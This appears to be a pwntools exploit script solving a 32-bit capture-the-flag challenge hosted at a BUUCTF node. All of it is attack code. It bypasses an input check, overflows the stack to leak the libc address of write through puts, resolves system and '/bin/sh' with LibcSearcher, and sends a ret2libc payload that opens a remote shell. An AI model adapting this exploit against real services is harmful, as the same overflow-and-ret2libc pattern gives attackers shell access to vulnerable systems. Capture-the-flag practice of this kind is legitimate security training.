from os import write
from pwn import *
from LibcSearcher import *

# 泄露libc然后system("/bin/sh")
# 非常典型的libc基址泄露

context.os = "linux"
context.arch="i386"

elf = ELF("./pwn")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = 0x8048825
# print(hex(write_plt), hex(write_got))

puts_plt = elf.plt["puts"]

if args.LOCAL:
    p = process("./pwn")
else:
    p = remote("node3.buuoj.cn", 28780)

payload1 = b'\x00'+b'\xff'*7
p.sendline(payload1)
p.recvuntil("Correct\n")

payload2 = b'a'*0xe7 + b'a'*4 + p32(puts_plt) + p32(main_addr) + p32(write_got)
p.sendline(payload2)

write_addr = u32(p.recv(4))
libc = LibcSearcher("write", write_addr)
offset = write_addr - libc.dump("write")

sys_addr = libc.dump("system") + offset
binsh_addr = libc.dump("str_bin_sh") + offset

payload3 = b'a'*(0xe7 + 4) + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh_addr)
p.sendline(payload1)
p.recvuntil("Correct\n")

p.sendline(payload3)

p.interactive()